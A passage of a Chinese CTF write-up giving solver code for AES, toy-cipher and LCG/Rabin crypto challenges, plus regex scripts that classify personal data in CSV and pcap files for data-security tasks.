class="comment">/*S盒置换*/</span></span><br><span class="line">		ShiftRows(PlainText1);	<span class="comment">/*行移位*/</span></span><br><span class="line">		MixColumns(PlainText1, PlainText2);	<span class="comment">/*列混淆*/</span></span><br><span class="line">		ExtendCipherKey(CipherKey_word + <span class="number">4</span> * i, i);<span class="comment">/*子密钥生成*/</span></span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)  WordToChar(CipherKey_word[k + <span class="number">4</span> * (i + <span class="number">1</span>)], CipherKey + <span class="number">4</span> * k);</span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)  <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, CipherKey[k]);</span><br><span class="line">		AddRoundKey(PlainText2, CipherKey);<span class="comment">/*轮密钥加*/</span></span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)  PlainText[k] = PlainText2[k];</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	SubBytes(PlainText, PlainText1, <span class="number">16</span>);</span><br><span class="line">	ShiftRows(PlainText1);</span><br><span class="line">	ExtendCipherKey(CipherKey_word + <span class="number">4</span> * i, i);</span><br><span class="line">	<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>;WordToChar(CipherKey_word[k + <span class="number">4</span> * (i + <span class="number">1</span>)], CipherKey + <span class="number">4</span> * k), k++);</span><br><span class="line">	AddRoundKey(PlainText1, CipherKey);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n最终AES加密后的密文为：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)  <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, PlainText1[i]);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    PlainText1[i]=mm[i];   <span class="comment">// 解密第二段第三段偏移16，32即可</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n**************开始解密***************&quot;</span>);</span><br><span class="line">	AddRoundKey(PlainText1, CipherKey);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	    SubBytesRe(PlainText1, PlainText, <span class="number">16</span>);<span class="comment">/*S盒置换*/</span></span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>; WordToChar(CipherKey_word[k + <span class="number">40</span> - <span class="number">4</span> * (i + <span class="number">1</span>)], CipherKey + <span class="number">4</span> * k),k++);<span class="comment">/*子密钥生成*/</span></span><br><span class="line">		ShiftRowsRe(PlainText);<span class="comment">/*行移位逆*/</span></span><br><span class="line">		AddRoundKey(PlainText, CipherKey);<span class="comment">/*轮密钥加*/</span></span><br><span class="line">		MixColumnsRe(PlainText);<span class="comment">/*列混淆逆运算*/</span></span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>;PlainText1[k] = PlainText[k],k++);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n最后一次循环：&quot;</span>);</span><br><span class="line">	ShiftRowsRe(PlainText);<span class="comment">/*行移位逆*/</span></span><br><span class="line">	SubBytesRe(PlainText, PlainText1, <span class="number">16</span>);<span class="comment">/*S盒置换*/</span></span><br><span class="line">	AddRoundKey(PlainText1, CipherKey1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n最终AES解密后的明文为：&quot;</span>);</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)  <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,getcc( PlainText1[i]));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Crypto">Crypto</h3>
<h4 id="MyCode">MyCode</h4>
<p>key一共四字节，已经给了12bit，爆破就行了</p>
<p>要先把给的Ciphertext两两分割转列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">substitute</span>(<span class="params">state, sub_box</span>):</span><br><span class="line">    <span class="keyword">return</span> [sub_box[b &amp; <span class="number">0xF</span>] | (sub_box[(b &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>] &lt;&lt; <span class="number">4</span>) <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_round_keys</span>(<span class="params">base_key, rounds</span>):</span><br><span class="line">    round_keys = []</span><br><span class="line">    temp_key = base_key</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        round_keys.append(temp_key &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        temp_key ^= ((temp_key &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span>) | ((temp_key &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>)</span><br><span class="line">    <span class="keyword">return</span> round_keys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_state</span>(<span class="params">base_key, state, rounds, encrypt</span>):</span><br><span class="line">    sub_box = [<span class="number">0x9</span>, <span class="number">0x4</span>, <span class="number">0xA</span>, <span class="number">0xB</span>, <span class="number">0xD</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0xC</span>, <span class="number">0xE</span>, <span class="number">0xF</span>, <span class="number">0x7</span>]</span><br><span class="line">    inv_sub_box = [<span class="number">0xA</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0xB</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0xF</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0xC</span>, <span class="number">0x4</span>, <span class="number">0xD</span>, <span class="number">0xE</span>]</span><br><span class="line"></span><br><span class="line">    round_keys = generate_round_keys(base_key, rounds)</span><br><span class="line">    <span class="keyword">if</span> encrypt:</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">            state = substitute(state, sub_box)</span><br><span class="line">            state = [s ^ ((round_keys[<span class="built_in">round</span>] &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(state)]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(rounds - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            state = [s ^ ((round_keys[<span class="built_in">round</span>] &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(state)]</span><br><span class="line">            state = substitute(state, inv_sub_box)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, key, rounds=<span class="number">10</span></span>):</span><br><span class="line">    length = <span class="built_in">len</span>(plaintext)</span><br><span class="line">    padded_length = length <span class="keyword">if</span> length % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">else</span> length + (<span class="number">4</span> - (length % <span class="number">4</span>))</span><br><span class="line">    plaintext += <span class="string">b&#x27;\x00&#x27;</span> * (padded_length - length)</span><br><span class="line"></span><br><span class="line">    ciphertext = <span class="built_in">bytearray</span>(padded_length)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, padded_length, <span class="number">4</span>):</span><br><span class="line">        state = <span class="built_in">list</span>(plaintext[i:i+<span class="number">4</span>])</span><br><span class="line">        state = process_state(key, state, rounds, <span class="literal">True</span>)</span><br><span class="line">        ciphertext[i:i+<span class="number">4</span>] = state</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, key, rounds=<span class="number">10</span></span>):</span><br><span class="line">    length = <span class="built_in">len</span>(ciphertext)</span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>(length)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, <span class="number">4</span>):</span><br><span class="line">        state = <span class="built_in">list</span>(ciphertext[i:i+<span class="number">4</span>])</span><br><span class="line">        state = process_state(key, state, rounds, <span class="literal">False</span>)</span><br><span class="line">        plaintext[i:i+<span class="number">4</span>] = state</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext.rstrip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ciphertext = <span class="string">&#x27;A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401&#x27;</span></span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(Ciphertext),<span class="number">2</span>): </span><br><span class="line">    ciphertext.append(<span class="built_in">int</span>(Ciphertext[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b&#x27;DASCTF&#123;&#x27;</span></span><br><span class="line">key = <span class="number">0xECB</span></span><br><span class="line"><span class="built_in">print</span>(key.bit_length())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">21</span>)):</span><br><span class="line">    flag = decrypt(ciphertext,key*<span class="number">2</span>**<span class="number">20</span>+i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;DASCTF&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h4 id="DlcgH-r">DlcgH_r</h4>
<p>Diffie-Hellman问题，但其实简单爆破出s和t即可，然后就是rabin解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">2565258348684709722726260231955260453241716968378483821594041597297293609376806025180965681289016169408781752953380586044352169083397987333072306444539318806255242559916564022662479</span></span><br><span class="line">a = <span class="number">7703427441632069990122897903141278700284019287330080801753208940444135129072547305259960648105321270085533531118395452229965873504176368162947864923497711</span></span><br><span class="line">b = <span class="number">8477265953761650860710068507342719089504862957398782381045770264963932696457722724393775545810962476516315838411812248360284564925846788951219272632661157</span></span><br><span class="line">s = <span class="number">9228773209718156231041982890745928246648483643042884535935071957475932603607283209094294685862893340598940862096657878372229519375655468524041406914666867</span></span><br><span class="line">A = <span class="number">434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span></span><br><span class="line">B = <span class="number">434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span></span><br><span class="line"><span class="keyword">assert</span> A==B</span><br><span class="line"></span><br><span class="line">seed = s</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> seed!=A:</span><br><span class="line">    seed = (a*seed+b)%p</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(count)</span><br><span class="line"><span class="comment">#12345</span></span><br><span class="line">seed = A</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12345</span>):</span><br><span class="line">    seed = (a*seed+b)%p</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"></span><br><span class="line">p2 = next_prime(seed)</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">3241139665583501598296135149075754735041636843305130049654913708275571916563715101898946962033698805416493133339619007016676895968314902474922279948997540924678346952667095320094789476561995339618782687993966133770687551933070478999383821269223854568552819152909266096733330218505088222661907600152055916956562332379930822529724151378274932991887183193175206749</span></span><br><span class="line">c = <span class="number">1131281812215293796960536920068009435705926803182047772347743960804329656316689664084120353862091370978145286943689311985878028828902275260824388998300548644880722651153603738691769179255824425771260974588160589473958033612303767050773921373389315920529311000160530833707622310013322631917184737227893101365726934901652170763292132835433158093074003616578836411</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">4</span></span><br><span class="line">q2 = n2//p2</span><br><span class="line"><span class="built_in">print</span>(isPrime(q2),isPrime(p2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span><br><span class="line">    n = p*q</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, (p+<span class="number">1</span>)//<span class="number">4</span>, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, (q+<span class="number">1</span>)//<span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp*p*mq + yq*q*mp) % n</span><br><span class="line">    rr = n-r</span><br><span class="line">    s = (yp*p*mq - yq*q*mp) % n</span><br><span class="line">    ss = n-s</span><br><span class="line">    <span class="keyword">return</span> (r,rr,s,ss)</span><br><span class="line"></span><br><span class="line">m = rabin_decrypt(c, p2, q2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(gmpy2.iroot(m[i],<span class="number">2</span>)[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="数据安全">数据安全</h3>
<h4 id="datasecurity-classify1">datasecurity_classify1</h4>
<p>从 csv 里面读取数据，然后用正则一个个判断数据的类型，然后导出 csv</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_name</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[\u4e00-\u9fa5]+$&quot;</span>, name):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_idcard</span>(<span class="params">idcard</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(idcard) != <span class="number">18</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    weights = [<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line">    check_codes = <span class="string">&quot;10X98765432&quot;</span></span><br><span class="line">    idcard_body = idcard[:-<span class="number">1</span>]</span><br><span class="line">    idcard_check_digit = idcard[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算校验码</span></span><br><span class="line">    total = <span class="built_in">sum</span>(<span class="built_in">int</span>(num) * weight <span class="keyword">for</span> num, weight <span class="keyword">in</span> <span class="built_in">zip</span>(idcard_body, weights))</span><br><span class="line">    remainder = total % <span class="number">11</span></span><br><span class="line">    expected_check_digit = check_codes[remainder]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> idcard_check_digit.upper() == expected_check_digit</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_phone</span>(<span class="params">phone</span>):</span><br><span class="line">    valid_prefixes = [</span><br><span class="line">        <span class="string">&#x27;734&#x27;</span>, <span class="string">&#x27;735&#x27;</span>, <span class="string">&#x27;736&#x27;</span>, <span class="string">&#x27;737&#x27;</span>, <span class="string">&#x27;738&#x27;</span>, <span class="string">&#x27;739&#x27;</span>, <span class="string">&#x27;747&#x27;</span>, <span class="string">&#x27;748&#x27;</span>, <span class="string">&#x27;750&#x27;</span>, <span class="string">&#x27;751&#x27;</span>, <span class="string">&#x27;752&#x27;</span>, <span class="string">&#x27;757&#x27;</span>, <span class="string">&#x27;758&#x27;</span>, <span class="string">&#x27;759&#x27;</span>, <span class="string">&#x27;772&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;778&#x27;</span>, <span class="string">&#x27;782&#x27;</span>, <span class="string">&#x27;783&#x27;</span>, <span class="string">&#x27;784&#x27;</span>, <span class="string">&#x27;787&#x27;</span>, <span class="string">&#x27;788&#x27;</span>, <span class="string">&#x27;795&#x27;</span>, <span class="string">&#x27;798&#x27;</span>, <span class="string">&#x27;730&#x27;</span>, <span class="string">&#x27;731&#x27;</span>, <span class="string">&#x27;732&#x27;</span>, <span class="string">&#x27;740&#x27;</span>, <span class="string">&#x27;745&#x27;</span>, <span class="string">&#x27;746&#x27;</span>, <span class="string">&#x27;755&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;756&#x27;</span>, <span class="string">&#x27;766&#x27;</span>, <span class="string">&#x27;767&#x27;</span>, <span class="string">&#x27;771&#x27;</span>, <span class="string">&#x27;775&#x27;</span>, <span class="string">&#x27;776&#x27;</span>, <span class="string">&#x27;785&#x27;</span>, <span class="string">&#x27;786&#x27;</span>, <span class="string">&#x27;796&#x27;</span>, <span class="string">&#x27;733&#x27;</span>, <span class="string">&#x27;749&#x27;</span>, <span class="string">&#x27;753&#x27;</span>, <span class="string">&#x27;773&#x27;</span>, <span class="string">&#x27;774&#x27;</span>, <span class="string">&#x27;777&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;780&#x27;</span>, <span class="string">&#x27;781&#x27;</span>, <span class="string">&#x27;789&#x27;</span>, <span class="string">&#x27;790&#x27;</span>, <span class="string">&#x27;791&#x27;</span>, <span class="string">&#x27;793&#x27;</span>, <span class="string">&#x27;799&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(phone) == <span class="number">11</span> <span class="keyword">and</span> phone[:<span class="number">3</span>] <span class="keyword">in</span> valid_prefixes:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;data.csv&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> validate_name(line):</span><br><span class="line">        result += <span class="string">f&quot;姓名,<span class="subst">&#123;line&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> validate_idcard(line):</span><br><span class="line">        result += <span class="string">f&quot;身份证号,<span class="subst">&#123;line&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> validate_phone(line):</span><br><span class="line">        result += <span class="string">f&quot;手机号,<span class="subst">&#123;line&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).write(result)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/kTKu4OweFWaq2np.png"
                        alt="image-20241109135428965"
                 ></p>
<h4 id="datasecurity-classify2">datasecurity_classify2</h4>
<p>用 tshark 导出所有 http 请求的 post数据，然后 unhex 后用正则匹配出里面的信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\tshark.exe -r <span class="string">&quot;D:\CTF\race_temp\历史\Yangchengbei2024-初赛\datesafe2\data.pcapng&quot;</span> -Y <span class="string">&quot;http&quot;</span> -T fields -e http.file_data &gt; D:\CTF\race_temp\历史\Yangchengbei2024-初赛\datesafe2\out.txt</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/7PwjdkWsmez69oJ.png"
                        alt="image-20241109135146219"
                 ></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_idcard</span>(<span class="params">idcard</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(idcard) != <span class="number">18</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    weights = [<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line">    check_codes = <span class="string">&quot;10X98765432&quot;</span></span><br><span class="line">    idcard_body = idcard[:-<span class="number">1</span>]</span><br><span class="line">    idcard_check_digit = idcard[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算校验码</span></span><br><span class="line">    total = <span class="built_in">sum</span>(<span class="built_in">int</span>(num) * weight <span class="keyword">for</span> num, weight <span class="keyword">in</span> <span class="built_in">zip</span>(idcard_body, weights))</span><br><span class="line">    remainder = total % <span class="number">11</span></span><br><span class="line">    expected_check_digit = check_codes[remainder]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> idcard_check_digit.upper() == expected_check_digit</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_phone</span>(<span class="params">phone</span>):</span><br><span class="line">    valid_prefixes = [</span><br><span class="line">        <span class="string">&quot;734&quot;</span>, <span class="string">&quot;735&quot;</span>, <span class="string">&quot;736&quot;</span>, <span class="string">&quot;737&quot;</span>, <span class="string">&quot;738&quot;</span>, <span class="string">&quot;739&quot;</span>, <span class="string">&quot;747&quot;</span>, <span class="string">&quot;748&quot;</span>, <span class="string">&quot;750&quot;</span>, <span class="string">&quot;751&quot;</span>, <span class="string">&quot;752&quot;</span>, <span class="string">&quot;757&quot;</span>, <span class="string">&quot;758&quot;</span>, <span class="string">&quot;759&quot;</span>, <span class="string">&quot;772&quot;</span>, <span class="string">&quot;778&quot;</span>,</span><br><span class="line">        <span class="string">&quot;782&quot;</span>, <span class="string">&quot;783&quot;</span>, <span class="string">&quot;784&quot;</span>, <span class="string">&quot;787&quot;</span>, <span class="string">&quot;788&quot;</span>, <span class="string">&quot;795&quot;</span>, <span class="string">&quot;798&quot;</span>, <span class="string">&quot;730&quot;</span>, <span class="string">&quot;731&quot;</span>, <span class="string">&quot;732&quot;</span>, <span class="string">&quot;740&quot;</span>, <span class="string">&quot;745&quot;</span>, <span class="string">&quot;746&quot;</span>, <span class="string">&quot;755&quot;</span>, <span class="string">&quot;756&quot;</span>, <span class="string">&quot;766&quot;</span>,</span><br><span class="line">        <span class="string">&quot;767&quot;</span>, <span class="string">&quot;771&quot;</span>, <span class="string">&quot;775&quot;</span>, <span class="string">&quot;776&quot;</span>, <span class="string">&quot;785&quot;</span>, <span class="string">&quot;786&quot;</span>, <span class="string">&quot;796&quot;</span>, <span class="string">&quot;733&quot;</span>, <span class="string">&quot;749&quot;</span>, <span class="string">&quot;753&quot;</span>, <span class="string">&quot;773&quot;</span>, <span class="string">&quot;774&quot;</span>, <span class="string">&quot;777&quot;</span>, <span class="string">&quot;780&quot;</span>, <span class="string">&quot;781&quot;</span>, <span class="string">&quot;789&quot;</span>,</span><br><span class="line">        <span class="string">&quot;790&quot;</span>, <span class="string">&quot;791&quot;</span>, <span class="string">&quot;793&quot;</span>, <span class="string">&quot;799&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(phone) == <span class="number">11</span> <span class="keyword">and</span> phone[:<span class="number">3</span>] <span class="keyword">in</span> valid_prefixes:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> ip.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        <span class="comment"># if len(str(int(_))) != len(_):</span></span><br><span class="line">        <span class="comment">#     return False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ( <span class="number">0</span> &lt;= <span class="built_in">int</span>(_) &lt;= <span class="number">255</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;pppdd.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;category,value\n&quot;</span></span><br><span class="line"></span><br><span class="line">ip_r = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d+\.\d+\.\d+\.\d+&quot;</span>)</span><br><span class="line">idcard1 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;18&#125;&quot;</span>)</span><br><span class="line">idcard2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;6&#125;[ -]\d&#123;8&#125;[ -]\d&#123;4&#125;&quot;</span>)</span><br><span class="line">idcard12 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;17&#125;[xX]&quot;</span>)</span><br><span class="line">idcard2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;6&#125;[ -]\d&#123;8&#125;[ -]\d&#123;4&#125;&quot;</span>)</span><br><span class="line">idcard22 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;6&#125;[ -]\d&#123;8&#125;[ -]\d&#123;3&#125;[xX]&quot;</span>)</span><br><span class="line">phone1 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;11&#125;&quot;</span>)</span><br><span class="line">phone2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;3&#125;[ -]\d&#123;4&#125;[ -]\d&#123;4&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">mpx = &#123;&#125;</span><br><span class="line"></span><br><span class="line">result3 = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    dt = binascii.unhexlify(line.strip()).decode()</span><br><span class="line">    <span class="comment"># result3 += dt + &quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    idcards = idcard1.findall(dt) + idcard2.findall(dt) + idcard12.findall(dt) + idcard22.findall(dt)</span><br><span class="line">    phones = phone1.findall(dt) + phone2.findall(dt)</span><br><span class="line">    ips = ip_r.findall(dt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> idcards:</span><br><span class="line">        idcard = _.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span 